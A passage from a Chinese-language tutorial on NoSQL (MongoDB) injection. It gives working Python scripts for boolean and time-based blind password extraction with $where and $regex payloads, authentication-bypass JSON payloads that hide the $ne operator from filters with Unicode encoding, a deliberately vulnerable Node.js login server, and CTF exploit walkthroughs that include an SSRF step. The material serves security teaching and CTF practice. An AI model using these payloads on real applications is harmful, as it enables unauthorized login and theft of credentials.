                data = {
                    "username": "admin'&&this.password.substr(-" + str(i) + ")=='" + str(c + res) + "') {return true;}})//",
                    "password": "123456"
                }
                r = requests.post(url=url,headers=headers, data=data)
                if "Login Success" in r.text:
                    res = c + res
                    print("[+] " + res)
                    break
        else:
            print("[-] Failed")
            break
    # 输出如下: 
    # [+] 6
    # [+] 56
    # [+] 456
    # [+] 3456
    # [+] 23456
    # [+] 123456
**$where 操作符时间盲注**
时间盲注也很好理解了，还是用上面那个 index.php 演示，直接给出 payload：
    username=admin'%26%26this.password.substr(-1)=='6') {sleep(2000);}})//&password=1
如果匹配正确则会有 2 秒的延迟，下面给出时间盲注脚本：
    import time
    import requests
    url = "http://192.168.219.130/"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    strings = "abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*()"
    res = ""
    for i in range(len(res)+1,30):
        if len(res) == i-1:
            for c in strings:
                data = {
                    "username": "admin'&&this.password.substr(-" + str(i) + ")=='" + str(c + res) + "') {sleep(2000);}})//",
                    "password": "123456"
                }
                times = time.time()
                r = requests.post(url=url,headers=headers, data=data)
                if time.time() - times >= 2:
                    res = c + res
                    print("[+] " + res)
                    break
        else:
            print("[-] Failed")
            break
    # 输出如下: 
    # [+] 6
    # [+] 56
    # [+] 456
    # [+] 3456
    # [+] 23456
    # [+] 123456
## Nodejs 中的 MongoDB 注入
在 Nodejs 中也存在 MongoDB 注入的问题，其中主要是重言式注入，通过构造永真式构造万能密码实现登录绕过。下面我们使用 Nodejs 中的
mongoose 模块操作 MongoDB 进行演示。
  * server.js
    var express = require('express');
    var mongoose = require('mongoose');
    var jade = require('jade');
    var bodyParser = require('body-parser');
    mongoose.connect('mongodb://localhost/test', { useNewUrlParser: true });
    var UserSchema = new mongoose.Schema({
        name: String,
        username: String,
        password: String
    });
    var User = mongoose.model('users', UserSchema);
    var app = express();
    app.set('views', __dirname);
    app.set('view engine', 'jade');
    app.get('/', function(req, res) {
        res.render ("index.jade",{
            message: 'Please Login'
        });
    });
    app.use(bodyParser.json());
    app.post('/', function(req, res) {
        console.log(req.body)
        User.findOne({username: req.body.username, password: req.body.password}, function (err, user) {
            console.log(user)
            if (err) {
                return res.render('index.jade', {message: err.message});
            }
            if (!user) {
                return res.render('index.jade', {message: 'Login Failed'});
            }
            return res.render('index.jade', {message: 'Welcome back ' + user.name + '!'});
        });
    });
    var server = app.listen(8000, '0.0.0.0', function () {
        var host = server.address().address
        var port = server.address().port
        console.log("listening on http://%s:%s", host, port)
    });
  * index.jade
    h1 #{message}
    p #{message}
运行 server.js 后，访问 8000 端口：
由于后端解析 JSON，所以我们发送 JSON 格式的 payload：
    {"username":{"$ne":1},"password": {"$ne":1}}
如上图所示，成功登录。
在处理 MongoDB 查询时，经常会使用 JSON格式将用户提交的数据发送到服务端，如果目标过滤了 `$ne` 等关键字，我们可以使用 Unicode
编码绕过，因为 JSON 可以直接解析 Unicode。如下所示：
    {"username":{"\u0024\u006e\u0065":1},"password": {"\u0024\u006e\u0065":1}}
    // {"username":{"$ne":1},"password": {"$ne":1}}
## Nosql 相关 CTF 例题
###  [2021 MRCTF]Half-Nosqli
进入题目，发现是一个Swagger UI：
有两个 Api 接口，一个是 `/login` 用于登录，另一个是 `/home` 可通过 url 属性进行 SSRF。我们可以编写脚本来访问这两个 Api
接口。首先访问 `/home`接口报错，因为需要验证，所以思路应该是先访问 `/login` 接口进行登录，登录后拿到 token 再去访问 `/home`
接口。这里由于题目名提示了是 NoSQL，所以我们可以直接使用 NoSQL 的永真式绕过。
这里没有任何过滤，Exp 如下：
    import requests
    import json
    url = "http://node.mrctf.fun:23000/"
    json_data = {
      "email": {"$ne": ""},
      "password": {"$ne": ""}
    }
    res = requests.post(url=url+'login',json=json_data)
    token = res.json()['token']
    json_data2 = {
        "url":"http://47.xxx.xxx.72:4000"    # 通过这里的url值进行SSRF
    }
    headers = {
        "Authorization":"Bearer "+token
    }
    res2 = requests.post(url=url+'home',json=json_data2,headers=headers)
    print(res2)
这样我们便可以通过 `/home` 接口的 url 值进行SSRF了：
接下来是一个 HTTP 拆分攻击，详情请看：[[2021 MRCTF]Half-Nosqli](https://whoamianony.top/2021/04/20/Web%E5%AE%89%E5%85%A8/HTTP%E5%93%8D%E5%BA%94%E6%8B%86%E5%88%86%E6%94%BB%E5%87%BB%EF%BC%88CRLF%20Injection%EF%BC%89/#2021-MRCTF-Half-Nosqli)
###  [GKCTF 2021]hackme
进入题目，是一个登录框：
查看源码发现如下提示：
应该是 nosql 注入，随机登录抓包发现解析 json：
首先构造永真式：
    {"username":{"$ne":1},"password": {"$ne":1}}
被检测了，使用 Unicode 编码成功绕过：
应该是通过 Nosql 盲注，让我们把 admin 的密码爆出来，根据以下条件进行布尔盲注：
    {"msg":"登录了，但没完全登录"}    // 真
    {"msg":"登录失败"}    // 假
如下编写盲注脚本：
    import requests
    import string
    password = ''
    url = 'http://node4.buuoj.cn:27409/login.php'
    while True:
        for c in string.printable:
            if c not in ['*', '+', '.', '?', '|', '#', '&', '$']:
                # When the method is GET
                get_payload = '?username=admin&password[$regex]=^%s' % (password + c)
                # When the method is POST
                post_payload = {
                    "username": "admin",
                    "password[$regex]": '^' + password + c
                }
                # When the method is POST with JSON
                json_payload = """{"username":"admin", "password":{"\\u0024\\u0072\\u0065\\u0067\\u0065\\u0078":"^%s"}}""" % (password + c)
                headers = {'Content-Type': 'application/json'}
                r = requests.post(url=url, headers=headers, data=json_payload)    # 简单发送 json
                #r = requests.post(url=url, data=post_payload)
                if '但没完全登录' in r.content.decode():
                    print("[+] %s" % (password + c))
                    password += c
    # 输出:
    # [+] 4
    # [+] 42
    # [+] 422
    # [+] 4227
    # [+] 42276
    # [+] 422766
    # ......
    # [+] 42276606202db06ad1f29ab6b4a1
    # [+] 42276606202db06ad1f29ab6b4a13
    # [+] 42276606202db06ad1f29ab6b4a130
    # [+] 42276606202db06ad1f29ab6b4a1307
    # [+] 42276606202db06ad1f29ab6b4a1307f
得到 admin 密码后即可成功登录 admin。
## Nosql 注入相关工具
Github上有个叫[NoSQLAttack](https://github.com/youngyangyang04/NoSQLAttack)工具，不过已经没有维护了。
另外还有一个[NoSQLMap](https://github.com/codingo/NoSQLMap)工具，这个项目作者仍在维护。
## Ending……
> 参考：
>
>  guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection>
>
> 
>
>
> 
>
> 
>
> 
>
> 
>
> 
>
> 
>
> 
>
> 
>
> 